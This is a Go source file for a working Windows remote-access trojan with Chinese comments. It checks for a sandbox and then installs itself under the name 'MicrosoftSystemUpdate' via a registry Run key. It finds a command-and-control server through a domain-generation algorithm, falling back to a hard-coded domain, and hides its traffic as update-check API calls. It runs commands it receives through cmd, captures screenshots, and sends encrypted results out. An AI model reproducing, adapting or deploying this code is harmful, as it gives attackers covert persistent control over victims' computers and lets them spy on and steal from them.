package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/md5"
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"image/png"
	"io"
	"net/http"
	"os"
	"os/exec"

	"path/filepath"
	"runtime"
	"strings"
	"time"

	"github.com/kbinani/screenshot"
	"golang.org/x/sys/windows/registry"
	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/transform"
)

// [配置]
const BackupURL = "https://api.cailiu666.xyz/api/v1/check_update"
const DGASeed = "MySecretSeed2024"
var AESKey = []byte("HereIsMySecretKey123456789012345")
const AppName = "MicrosoftSystemUpdate"
const ExeName = "sys_update.exe"

// --- 结构体 ---
type FakeAPIResponse struct {
	Code    int    `json:"code"`
	Data    string `json:"data"`
}
type FakeAPIRequest struct {
	Hostname string `json:"hostname"`
	Token    string `json:"token"`
	Status   string `json:"status"`
}

// --- DGA 生成 (保持不变) ---
func generateDGADomains(count int) []string {
	domains := make([]string, 0)
	dateStr := time.Now().Format("2006-01-02")
	fmt.Printf("[DGA] 计算基准日期: %s, 种子: %s\n", dateStr, DGASeed)
	for i := 0; i < count; i++ {
		raw := fmt.Sprintf("%s%s%d", dateStr, DGASeed, i)
		hasher := md5.New()
		hasher.Write([]byte(raw))
		hash := hex.EncodeToString(hasher.Sum(nil))
		// 主域名部分
		baseDomain := fmt.Sprintf("https://%s.net", hash[0:12])
		domains = append(domains, baseDomain)
	}
	return domains
}

// --- [核心修复] DGA 连接检查 ---
// 只探测 Web 服务是否存活，不发送业务数据
func tryConnect(client *http.Client, baseDomain string) bool {
	// 探测一个无关紧要的路径，比如根路径或 /ping
	probeURL := baseDomain + "/ping"
	fmt.Printf("[DGA] 探测: %s ... ", probeURL)
	
	// 使用 HEAD 方法，只获取响应头，速度快，流量小
	req, _ := http.NewRequest("HEAD", probeURL, nil)
	
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("失败 (网络不可达)")
		return false
	}
	defer resp.Body.Close()

	// 只要收到了 HTTP 响应 (任何状态码)，就说明服务器是活的
	// 因为 Cloudflare 会返回 404
	fmt.Printf("成功! (收到 HTTP %d)\n", resp.StatusCode)
	return true
}

// --- 其他功能 (保持不变) ---
func getHostname() string {
	name, err := os.Hostname()
	if err != nil { name = "UNKNOWN" }
	return name
}
func checkSandbox() bool { if runtime.NumCPU() < 2 { return true }; return false }
func takeScreenshot() string {
	n := screenshot.NumActiveDisplays()
	if n <= 0 { return "Error: No display" }
	bounds := screenshot.GetDisplayBounds(0)
	img, err := screenshot.CaptureRect(bounds)
	if err != nil { return fmt.Sprintf("Error: %v", err) }
	var buf bytes.Buffer
	png.Encode(&buf, img)
	return "[IMAGE]" + base64.StdEncoding.EncodeToString(buf.Bytes())
}
func installPersistence() {
	exePath, _ := os.Executable()
	configDir, _ := os.UserConfigDir()
	destPath := filepath.Join(configDir, ExeName)
	if strings.EqualFold(exePath, destPath) { return }
	input, _ := os.ReadFile(exePath)
	os.WriteFile(destPath, input, 0777)
	k, _ := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.ALL_ACCESS)
	defer k.Close()
	k.SetStringValue(AppName, destPath)
}
func GbkToUtf8(s []byte) (string, error) {
	r := transform.NewReader(bytes.NewReader(s), simplifiedchinese.GBK.NewDecoder())
	d, e := io.ReadAll(r)
	if e != nil { return "", e }
	return string(d), nil
}
func Encrypt(text string) (string, error) {
	block, _ := aes.NewCipher(AESKey)
	aesGCM, _ := cipher.NewGCM(block)
	nonce := make([]byte, aesGCM.NonceSize())
	io.ReadFull(rand.Reader, nonce)
	ciphertext := aesGCM.Seal(nonce, nonce, []byte(text), nil)
	return base64.StdEncoding.EncodeToString(ciphertext), nil
}
func Decrypt(cryptoText string) (string, error) {
	data, _ := base64.StdEncoding.DecodeString(cryptoText)
	block, _ := aes.NewCipher(AESKey)
	aesGCM, _ := cipher.NewGCM(block)
	nonceSize := aesGCM.NonceSize()
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	plaintext, err := aesGCM.Open(nil, nonce, ciphertext, nil)
	return string(plaintext), err
}
func executeCommand(cmdStr string) string {
	if strings.TrimSpace(cmdStr) == "screenshot" { return takeScreenshot() }
	cmd := exec.Command("cmd", "/C", cmdStr)
	output, _ := cmd.CombinedOutput()
	utf8Output, _ := GbkToUtf8(output)
	return utf8Output
}

// --- Main 函数 (逻辑变更) ---
func main() {
	if checkSandbox() { return }
	installPersistence()

	tr := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
	dgaClient := &http.Client{Timeout: 5 * time.Second, Transport: tr}

	fmt.Println("======== [Agent: DGA Negotiation] ========")
	
	candidateBaseDomains := generateDGADomains(3)
	var finalBaseDomain string = ""

	for _, domain := range candidateBaseDomains {
		if tryConnect(dgaClient, domain) {
			finalBaseDomain = domain
			break
		}
	}

	if finalBaseDomain == "" {
		fmt.Println("[Fallback] 切换至保底域名...")
		finalBaseDomain = "https://api.cailiu666.xyz" // 只用主域名
	}

	// 最终拼接出心跳 URL
	finalC2URL := finalBaseDomain + "/api/v1/check_update"
	fmt.Printf("[+] C2 已锁定: %s\n", finalC2URL)
	fmt.Println("======== [Agent: C2 Loop Started] ========")
	
	mainClient := &http.Client{Timeout: 30 * time.Second, Transport: tr}
	hostname := getHostname()

	for {
		reqData := FakeAPIRequest{Hostname: hostname, Status: "idle"}
		jsonData, _ := json.Marshal(reqData)
		
		req, _ := http.NewRequest("POST", finalC2URL, bytes.NewBuffer(jsonData))
		req.Header.Set("User-Agent", "Mozilla/5.0...")
		req.Header.Set("Content-Type", "application/json")

		resp, err := mainClient.Do(req)
		if err != nil { time.Sleep(3 * time.Second); continue }
		
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		var apiResp FakeAPIResponse
		if json.Unmarshal(body, &apiResp) == nil && apiResp.Data != "" {
			command, err := Decrypt(apiResp.Data)
			if err == nil {
				result := executeCommand(command)
				encryptedResult, _ := Encrypt(result)
				
				resultData := FakeAPIRequest{Hostname: hostname, Token: encryptedResult}
				jsonResult, _ := json.Marshal(resultData)
				postReq, _ := http.NewRequest("POST", finalC2URL, bytes.NewBuffer(jsonResult))
				postReq.Header.Set("User-Agent", "Mozilla/5.0...")
				postReq.Header.Set("Content-Type", "application/json")
				mainClient.Do(postReq)
			}
		}
		time.Sleep(3 * time.Second)
	}
}